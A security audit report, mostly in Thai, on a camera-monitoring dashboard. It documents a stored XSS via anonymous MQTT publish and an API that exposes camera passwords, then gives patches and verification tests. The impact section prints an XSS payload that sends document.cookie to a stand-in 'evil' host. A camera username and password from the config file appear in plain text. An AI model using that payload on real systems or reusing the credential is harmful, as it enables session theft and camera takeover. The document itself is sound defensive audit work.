# HIGH Findings

> ⚠️ ระดับความรุนแรง: **HIGH** — direct exploit path มี, mitigation จำกัด
> ดูสารบัญ: [CLAUDE_Audit.MD](../../CLAUDE_Audit.MD)
>
> **SEC-002 Status: ✅ fixed (2026-05-28)** — escapeHtml + encodeURIComponent applied in renderEvents, renderSnapshots (grid + list). Commit: `9956c76`
> **SEC-003 Status: ✅ fixed (2026-05-28)** — role-based redact in GET /api/cameras. Commit: `(see below)`

---

## SEC-002 · Stored XSS ผ่าน MQTT data → admin session hijack

### 🔵 Fact

`dashboard/dashboard.js:2306-2336` (renderEvents) interpolate field ของ event เข้า HTML โดย**ไม่ได้ escape**:

```javascript
// Line 2329 — event_type ใส่ใน title attr, eventDisplayName ใส่เป็น text content
<span style="..." title="${ev.event_type}">${eventDisplayName(ev)}</span>
// Line 2330 — camera_id ใส่เป็น text content
<span style="...">${ev.camera_id}</span>
// Line 2332 — object_class / state เป็น text content
<span class="event-class">${catBadge}<span>${cls}</span></span>
// Line 2334 — snapshot_source เป็น text content
<span class="event-src ${srcCls}">${ev.snapshot_source || '—'}</span>
```

`eventDisplayName(ev)` ที่ `dashboard.js:466-469` คืน `ev.rule_name` ตรงๆ ไม่ escape

`renderSnapshots` (line 2465-2507) มี pattern เดียวกัน — `${ev.camera_id}`, `${ev.object_class}`, `${eventDisplayName(ev)}` ใส่ text content โดยไม่ escape

### 🟡 Impact

Chain มาจาก [SEC-001](01_critical.md#sec-001) (anonymous MQTT publish):
1. Attacker publish payload `{"Source":{"Rule":"<img src=x onerror=fetch('//evil/'+document.cookie)>"}}` บน topic `vic1/onvif-ej/RuleEngine/...`
2. mqtt-subscriber.js เก็บ rule_name ตรงๆ ลง DB
3. Admin/Operator เปิดหน้า Events Live → renderEvents() interpolate → browser execute
4. Session token รั่ว — token เก็บใน localStorage (Safari ITP fallback, ดู api-server.js:481-487 comment) → XSS อ่านได้ตรงๆ

### ✅ Verification (code-path)

- mqtt-subscriber.js:435 `ruleName = msg.Source?.Rule || null` → string ใดก็ได้
- mqtt-subscriber.js:537-541 INSERT (parameterized — SQLi-safe แต่ data ไม่ sanitize)
- dashboard.js:466-469 `eventDisplayName` คืน `ev.rule_name` ไม่ผ่าน escapeHtml
- dashboard.js:2329 `${eventDisplayName(ev)}` ใส่ text content ตรงๆ

⏸ **ไม่ได้ inject payload จริง** เพราะกระทบ admin คนอื่นที่ใช้งานอยู่. แต่ `escapeHtml` มีอยู่และถูกใช้ใน 327 ที่อื่นของ dashboard.js → จุดที่ตกหล่นเหล่านี้ omission ชัดเจน

### 🛠 Fix (P0-B)

#### Patch 1 — renderEvents (dashboard.js:2306-2336)

**Old (2321-2335):**
```javascript
return `
  <div class="event-row" style="border-left:3px solid ${tintColor}" onclick='showSnapshot(${JSON.stringify(ev).replace(/'/g,"&#39;")})'>
    <div class="event-thumb">
      ${hasSnap ? `<img src="${API}/snapshots/${ev.snapshot_file}?w=400" onerror="this.parentElement.innerHTML='<div class=no-img>err</div>'">` : `<div class="no-img">—</div>`}
    </div>
    <span style="font-size:14px">${icon}</span>
    <span class="event-time">${time}</span>
    <div style="overflow:hidden">
      <span style="color:var(--accent);font-weight:600" title="${ev.event_type}">${eventDisplayName(ev)}</span>${clipBadge}
      <span style="color:var(--muted);margin-left:6px;font-size:10px">${ev.camera_id}</span>
    </div>
    <span class="event-class" style="text-align:center">${catBadge}<span style="font-size:11px">${cls}</span></span>
    <span class="event-conf">${conf}</span>
    <span class="event-src ${srcCls}">${ev.snapshot_source || '—'}</span>
  </div>`;
```

**New:**
```javascript
// SEC-002: ทุก field ที่มาจาก MQTT/camera data ต้องผ่าน escapeHtml
// เพราะ MQTT topic/payload เป็น attacker-controlled (ดู SEC-001)
return `
  <div class="event-row" style="border-left:3px solid ${tintColor}" onclick='showSnapshot(${JSON.stringify(ev).replace(/'/g,"&#39;")})'>
    <div class="event-thumb">
      ${hasSnap ? `<img src="${API}/snapshots/${encodeURIComponent(ev.snapshot_file)}?w=400" onerror="this.parentElement.innerHTML='<div class=no-img>err</div>'">` : `<div class="no-img">—</div>`}
    </div>
    <span style="font-size:14px">${icon}</span>
    <span class="event-time">${time}</span>
    <div style="overflow:hidden">
      <span style="color:var(--accent);font-weight:600" title="${escapeHtml(ev.event_type || '')}">${escapeHtml(eventDisplayName(ev))}</span>${clipBadge}
      <span style="color:var(--muted);margin-left:6px;font-size:10px">${escapeHtml(ev.camera_id)}</span>
    </div>
    <span class="event-class" style="text-align:center">${catBadge}<span style="font-size:11px">${escapeHtml(cls)}</span></span>
    <span class="event-conf">${conf}</span>
    <span class="event-src ${srcCls}">${escapeHtml(ev.snapshot_source || '—')}</span>
  </div>`;
```

> `snapshot_file` ใช้ `encodeURIComponent` เพราะอยู่ใน URL context

#### Patch 2 — renderSnapshots grid view (dashboard.js:2473-2490)

**Old (2480-2487):**
```javascript
      <img src="${API}/snapshots/${ev.snapshot_file}?w=400" loading="lazy" onerror="this.style.opacity=0.3">
      ${clipBadge}
      <div class="snap-item-info">
        <div style="font-weight:600;display:flex;justify-content:space-between">
          <span>${ev.object_class || eventDisplayName(ev)}</span>
          <span style="color:${ev.snapshot_source === 'mqtt' ? 'var(--purple)' : 'var(--amber)'};font-size:8px">${ev.snapshot_source || ''}</span>
        </div>
        <div style="color:var(--dim);font-size:9px">${ev.camera_id} · ${time.toLocaleTimeString('th-TH',{hour:'2-digit',minute:'2-digit',hour12:false})}</div>
```

**New:**
```javascript
      <img src="${API}/snapshots/${encodeURIComponent(ev.snapshot_file)}?w=400" loading="lazy" onerror="this.style.opacity=0.3">
      ${clipBadge}
      <div class="snap-item-info">
        <div style="font-weight:600;display:flex;justify-content:space-between">
          <span>${escapeHtml(ev.object_class || eventDisplayName(ev))}</span>
          <span style="color:${ev.snapshot_source === 'mqtt' ? 'var(--purple)' : 'var(--amber)'};font-size:8px">${escapeHtml(ev.snapshot_source || '')}</span>
        </div>
        <div style="color:var(--dim);font-size:9px">${escapeHtml(ev.camera_id)} · ${time.toLocaleTimeString('th-TH',{hour:'2-digit',minute:'2-digit',hour12:false})}</div>
```

#### Patch 3 — renderSnapshots list view (dashboard.js:2497-2505)

**Old (2499-2503):**
```javascript
      <img src="${API}/snapshots/${ev.snapshot_file}?w=400" style="...">
      <div>
        <div style="font-weight:600;font-size:13px">${eventDisplayName(ev)} · ${ev.object_class || '—'}${clipChip}</div>
        <div style="color:var(--dim);font-size:11px;margin-top:2px">${ev.camera_id}</div>
```

**New:**
```javascript
      <img src="${API}/snapshots/${encodeURIComponent(ev.snapshot_file)}?w=400" style="...">
      <div>
        <div style="font-weight:600;font-size:13px">${escapeHtml(eventDisplayName(ev))} · ${escapeHtml(ev.object_class || '—')}${clipChip}</div>
        <div style="color:var(--dim);font-size:11px;margin-top:2px">${escapeHtml(ev.camera_id)}</div>
```

#### Patch 4 — renderMedia

Grep `function renderMedia` ใน dashboard.js, apply pattern เดียวกัน (escape ev.camera_id, ev.object_class, eventDisplayName, ev.snapshot_source)

### ✓ Verify-after

**Static repro (BEGIN/ROLLBACK เพื่อไม่ commit จริง):**
```sql
BEGIN;
UPDATE events SET rule_name = '<img src=x onerror=alert("XSS-test")>' WHERE id = (SELECT id FROM events ORDER BY event_time DESC LIMIT 1);
-- เปิด dashboard → Events Live → ต้อง render เป็น text ปกติ ไม่มี alert
-- ถ้าเห็น alert = XSS ยังหลุดอยู่
ROLLBACK;
```

หรือทดสอบใน DevTools console:
```javascript
allEvents.unshift({ event_time: new Date().toISOString(), camera_id: '<img src=x onerror=alert(1)>', event_type: 'test', snapshot_source: 'test' });
renderEvents();  // ต้องไม่มี alert
```

### 📝 Capture

เพิ่ม GOTCHAS entry หลังแก้:
> ทุก field จาก events / cameras / MQTT data ต้องผ่าน escapeHtml ก่อน inject ใน innerHTML
> เหตุผล: MQTT broker เปิด anonymous publish (ดู SEC-001), payload เป็น attacker-controlled

---

## SEC-003 · /api/cameras endpoint ส่ง camera password ออกมาเป็น plaintext

### 🔵 Fact

`src/api-server.js:1218-1281` (GET /api/cameras):

```javascript
app.get('/api/cameras', async (req, res) => {
  // ...
  const config = loadCameraConfig();
  const merged = (config.cameras || []).map(c => {
    const db = dbCameras[c.camera_id] || {};
    return {
      ...c,    // ← spread ทั้งหมดของ config รวม username + password
      status, last_seen, recording, ...
    };
  });
  res.json(merged);
});
```

`cameras-config.json` (verified จริง) มี field `password`:
```json
{ "camera_id": "BOSCH_8100i", "username": "service", "password": "WSS4Bosch!", ... }
```

`_redactCameraAudit(cam)` (line 1297-1304) มีอยู่และทำงานถูก — แต่**ถูกใช้แค่ใน audit log path** (line 1419, 1510, 1653), **ไม่ได้ใช้ใน GET /api/cameras response**

Endpoint นี้ผ่านแค่ global auth gate (`app.use('/api', ...)`) — ไม่ได้ check role → ผู้ใช้ทุกระดับ (admin / viewer / auditor) ดูได้

### 🟡 Impact

- Admin user / viewer / auditor ทุกคน → GET /api/cameras → ได้ RTSP password ของทุกกล้องเป็น plaintext
- ถ้า session token หลุด (SEC-002 stored XSS), attacker enumerate กล้องทั้งหมดได้ + password ครบ → เข้า web UI ของกล้อง / ดู live stream / รีเซ็ตกล้อง
- ถ้าเปิด port กล้องออก WAN จะเข้าได้เลย

### ✅ Live verification

```bash
$ grep -nE "c\.username|c\.password" dashboard/dashboard.js
5685: document.getElementById('frmCamUser').value = c.username || '';
5686: document.getElementById('frmCamPass').value = c.password || '';
```

🔴 **dashboard ใช้ field password ฝั่ง client** ที่ฟอร์มแก้ไขกล้อง — Recommendation เดิม "redact ทุก response" จะพังฟอร์ม (admin บันทึกฟอร์มกลับ → เขียน `***` ทับ password จริง)

⏸ ไม่ได้ curl /api/cameras จริง เพราะต้อง login + อาจ trip rate-limit prod. cameras-config.json + code path ยืนยันชัดเจน

### 🛠 Fix (P0-A) — role-based redact

**ไฟล์:** `src/api-server.js` (line ~1278-1279)

**Old:**
```javascript
    res.json(merged);
  } catch (err) { res.status(500).json({ error: err.message }); }
});
```

**New:**
```javascript
    // SEC-003: admin เห็น password เดิมเพื่อ prefill camera-edit form;
    // viewer/auditor ได้ค่า redacted (ไม่ควรเห็น camera creds อยู่แล้ว)
    const safe = req.user?.role === 'admin'
      ? merged
      : merged.map(_redactCameraAudit);
    res.json(safe);
  } catch (err) { res.status(500).json({ error: err.message }); }
});
```

#### ทางเลือกอื่น (ถ้ามีเวลา refactor)

**B. แยก endpoint สำหรับ credentials** — GET /api/cameras ไม่มี password เลย, มี endpoint แยก admin-only /api/cameras/:id/credentials พร้อม audit log

**C. Frontend bypass** — server return `password: null` ทุกที่, ฟอร์มแก้ไขแสดง placeholder "ปล่อยว่าง = คงเดิม", backend POST/PUT ถ้า password ว่าง → คงค่าเดิม

**แนะนำ:** A (P0 — เร่งก่อน), แล้วค่อย refactor เป็น C ใน sprint ถัดไป

### ✓ Verify-after

1. Login เป็น admin → DevTools → Network → GET /api/cameras response → password เป็น plaintext, ฟอร์มแก้ไขกล้องทำงานได้
2. สร้าง user role=viewer → login → GET /api/cameras → password ทุกกล้องเป็น `***`
3. สลับเป็น auditor → เหมือน viewer

### 📝 Capture (GOTCHAS entry)

```
#NN: GET /api/cameras returns redacted password for non-admin roles.
Reason: viewer/auditor have no UI that needs the camera RTSP password;
admin still gets plaintext so the edit-form prefill works without breaking.
Don't try to "simplify" by always redacting — line 5685-5686 in dashboard.js
relies on c.password to prefill frmCamPass.
```
